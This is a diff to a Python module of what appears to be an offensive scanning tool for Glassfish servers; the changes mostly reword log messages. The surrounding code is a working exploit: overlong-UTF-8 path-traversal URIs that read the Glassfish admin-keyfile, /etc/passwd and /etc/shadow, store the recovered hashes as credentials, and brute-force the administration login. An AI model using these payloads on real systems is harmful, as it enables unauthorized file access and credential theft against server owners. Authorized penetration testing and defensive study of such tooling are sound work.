@@ -21,10 +21,12 @@ lfi_urls = {
 
 class Module:
     name = 'Glassfish'
-    description = 'Discover and exploit glassfish (weak password, LFI) (port 4848)'
+    description = 'Discover and exploit glassfish (bruteforce, LFI) [ports: 4848]'
 
     def run(self, target, args, useragent, proxy, timeout, safe):
         http = HTTP(target['method'], target['hostname'], target['port'], useragent, proxy, timeout)
+
+        Output.minor({'target': http.url(target['path']), 'message': '[%s] Running module...' % self.name})
 
         res = http.get(target['path'])
 
@@ -56,9 +58,9 @@ class Module:
                     break
 
             if form:
-                Output.highlight({'target': http.url(target['path']), 'message': 'Glassfish administration interface'})
+                Output.highlight({'target': http.url(target['path']), 'message': '[%s] Administration interface' % self.name})
             else:
-                Output.highlight({'target': http.url(target['path']), 'message': 'Glassfish webserver'})
+                Output.highlight({'target': http.url(target['path']), 'message': '[%s] Glassfish webserver' % self.name})
 
             # Try to exploit the LFI
             for system, uri in lfi_urls.items():
@@ -77,7 +79,7 @@ class Module:
                 }
                 DB.insert_vulnerability(vuln_info)
 
-                Output.vuln({'target': http.url(target['path']), 'message': 'Glassfish server LFI'})
+                Output.vuln({'target': http.url(target['path']), 'message': '[%s] Glassfish server - Local File Inclusion vulnerability' % self.name})
 
                 # try to get the admin hash
                 exploit_uri = "/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afdomains/domain1/config/admin-keyfile"
@@ -100,14 +102,14 @@ class Module:
                             'hash': items[1],
                         }
                         DB.insert_credential(cred_info)
-                        Output.highlight({'target': http.url(target['path']), 'message': 'Glassfish username: %s hash: %s' % (items[0], items[1])})
+                        Output.highlight({'target': http.url(target['path']), 'message': '[%s] Glassfish username: %s hash: %s' % (self.name, items[0], items[1])})
 
                 if system == 'linux':
                     # get /etc/passwd
                     passwd_uri = "/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
                     res = http.get(os.path.join(target['path'], passwd_uri))
                     if res and res["code"] in [200] and res["title"] == "N/A":
-                        Output.highlight({'target': http.url(target['path']), 'message': 'Glassfish LFI exploitation: dumping /etc/passwd hashes to database'})
+                        Output.highlight({'target': http.url(target['path']), 'message': '[%s] Glassfish LFI exploitation: dumping /etc/passwd hashes to database' % self.name})
                         for account in parse_unix_passwd(res["html"]):
                             cred_info = {
                                 'hostname': target['hostname'],
@@ -125,7 +127,7 @@ class Module:
                     shadow_uri = "/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/shadow"
                     res = http.get(os.path.join(target['path'], shadow_uri))
                     if res and res["code"] in [200] and res["title"] == "N/A":
-                        Output.highlight({'target': http.url(target['path']), 'message': 'Glassfish LFI exploitation: dumping /etc/shadow hashes to database'})
+                        Output.highlight({'target': http.url(target['path']), 'message': '[%s] Glassfish LFI exploitation: dumping /etc/shadow hashes to database' % self.name})
                         for account in parse_unix_shadow(res["html"]):
                             cred_info = {
                                 'hostname': target['hostname'],
@@ -144,7 +146,7 @@ class Module:
 
             if form:
                 if args['bruteforce']:
-                    Output.highlight({'target': http.url(target['path']), 'message': 'Starting bruteforce...'})
+                    Output.highlight({'target': http.url(target['path']), 'message': '[%s] Starting bruteforce...' % self.name})
                     for cred in gen_bruteforce_creds(args['bruteforce'], creds):
                         username, password = cred.split(':')
 
@@ -187,7 +189,7 @@ class Module:
                         if after_auth_form != None:
                             continue
 
-                        Output.success({'target': http.url(target['path']), 'message': 'Authentication success to Glassfish with login %s and password %s' % (username, password)})
+                        Output.success({'target': http.url(target['path']), 'message': '[%s] Authentication success to Glassfish with login %s and password %s' % (self.name, username, password)})
 
                         cred_info = {
                             'hostname': target['hostname'],
